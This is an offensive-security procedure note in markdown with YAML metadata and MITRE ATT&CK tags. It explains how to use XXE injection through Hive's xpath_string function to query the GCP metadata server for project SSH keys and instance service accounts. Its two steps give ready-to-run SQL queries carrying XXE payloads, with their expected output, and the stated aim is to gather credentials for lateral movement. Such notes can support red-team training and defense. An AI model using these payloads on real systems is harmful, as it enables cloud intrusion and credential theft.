---
id: uuid-4
tags:
  - xxe
  - ssh-keys
  - service-accounts
type: procedure
tools:
  - '[[tools/Hive-JDBC]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/hive-xxe-fetch-ssh-keys]]'
  - '[[commands/hive-xxe-list-service-accounts]]'
verified: false
platforms:
  - GCP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[System Information Discovery]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T04:08:55.622Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[System Information Discovery]]'
  - '[[Unsecured Credentials]]'
---
# Fetch-SSH-Keys-and-Metadata-via-XXE

## Summary

This procedure uses XXE payloads to query GCP metadata for SSH keys and service account details, expanding reconnaissance after project ID retrieval.

## Description

Building on SSRF capability, target specific metadata paths like project attributes for SSH keys and instance service accounts. This exposes credentials usable for further lateral movement in GCP.

## Requirements

1. Confirmed Hive connection and XXE viability
2. Awareness of metadata API paths

## Defense

Defensive measures and detection strategies:

- Rotate SSH keys regularly and monitor metadata access
- Use IAM roles with least privilege for service accounts
- Audit XML processing in database functions

## Objectives

1. Enumerate SSH keys for potential instance access
2. List service accounts for token targeting
3. Gather credentials from metadata

## Instructions

### Step 1: Fetch SSH Keys

**Context**: Target project attributes endpoint for SSH key list.

**Command** ([[commands/hive-xxe-fetch-ssh-keys]]):
```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

> Returns multiple lines of redacted SSH keys.

### Step 2: List Service Accounts

**Context**: Enumerate available service accounts on the instance.

**Command** ([[commands/hive-xxe-list-service-accounts]]):
```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

> Outputs paths like 781002931567-compute@developer.gserviceaccount.com/default/.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[System Information Discovery]] System Information Discovery
- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/hive-xxe-fetch-ssh-keys]]
- [[commands/hive-xxe-list-service-accounts]]

## Tools Used

- [[tools/Hive-JDBC]]

## Tags

- [[xxe]]
- [[ssh-keys]]
- [[service-accounts]]
